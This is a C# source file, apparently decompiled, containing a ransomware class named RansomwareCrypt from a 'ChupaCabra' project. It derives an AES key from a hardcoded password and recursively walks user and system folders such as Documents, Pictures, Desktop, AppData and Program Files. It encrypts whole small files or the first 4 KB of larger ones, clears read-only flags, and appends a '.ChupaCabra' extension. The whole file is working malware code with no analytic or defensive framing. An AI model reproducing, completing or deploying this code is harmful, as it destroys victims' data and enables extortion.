using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace loki.ChupaCabra.teacher;

internal class RansomwareCrypt
{
	public enum Style
	{
		Tiled,
		Centered,
		Stretched
	}

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	public static string PasswordEncrypt = "ugsojfsoejoigjwpfdsfmisofjksepfselfs[gkreopf";

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public static byte[] RidjinEncrypt(byte[] byte_0)
	{
		byte[] array = null;
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.ASCII.GetBytes(PasswordEncrypt), Encoding.ASCII.GetBytes(PasswordEncrypt), 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFiles(string string_1)
	{
		try
		{
			try
			{
				if (new FileInfo(string_1).Length <= 4096L)
				{
					byte[] bytes = RidjinEncrypt(File.ReadAllBytes(string_1));
					File.WriteAllBytes(string_1, bytes);
					File.Move(string_1, string_1 + ".ChupaCabra");
				}
				else if (new FileInfo(string_1).Length <= 30000000L)
				{
					byte[] array = new byte[8192];
					using (BinaryReader binaryReader = new BinaryReader(File.Open(string_1, FileMode.Open)))
					{
						byte[] array2 = RidjinEncrypt(binaryReader.ReadBytes(4096));
						Array.Copy(array2, array, array2.Length);
					}
					using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(string_1, FileMode.Open)))
					{
						binaryWriter.Write(array);
					}
					File.Move(string_1, string_1 + ".ChupaCabra");
				}
			}
			catch (Exception)
			{
				FileAttributes attributes = File.GetAttributes(string_1);
				if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
				{
					attributes = fileAttrib(attributes, FileAttributes.ReadOnly);
					File.SetAttributes(string_1, attributes);
				}
				if (new FileInfo(string_1).Length <= 4096L)
				{
					byte[] bytes2 = RidjinEncrypt(File.ReadAllBytes(string_1));
					File.WriteAllBytes(string_1, bytes2);
					File.Move(string_1, string_1 + ".ChupaCabra");
				}
				else if (new FileInfo(string_1).Length <= 30000000L)
				{
					byte[] buffer = new byte[8192];
					using (BinaryReader binaryReader2 = new BinaryReader(File.Open(string_1, FileMode.Open)))
					{
						buffer = RidjinEncrypt(binaryReader2.ReadBytes(4096));
					}
					using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(string_1, FileMode.Open)))
					{
						binaryWriter2.Write(buffer);
					}
					File.Move(string_1, string_1 + ".ChupaCabra");
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static FileAttributes fileAttrib(FileAttributes fileAttributes_0, FileAttributes fileAttributes_1)
	{
		return fileAttributes_0 & ~fileAttributes_1;
	}

	public static void GetFile(string string_1)
	{
		try
		{
			string[] files = Directory.GetFiles(string_1);
			string[] directories = Directory.GetDirectories(string_1);
			for (int i = 0; i < files.Length; i++)
			{
				if (!Path.GetExtension(files[i])!.Contains("ChupaCabra"))
				{
					EncryptFiles(files[i]);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				GetFile(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	internal void Start()
	{
	}

	internal static void start()
	{
		if (!File.Exists(Environment.GetEnvironmentVariable("ProgramData") + "\\trig"))
		{
			string[] array = new string[19]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.Recent),
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
				Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
				Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
			};
			for (int i = 0; i < array.Length; i++)
			{
				GetFile(array[i]);
			}
		}
	}
}
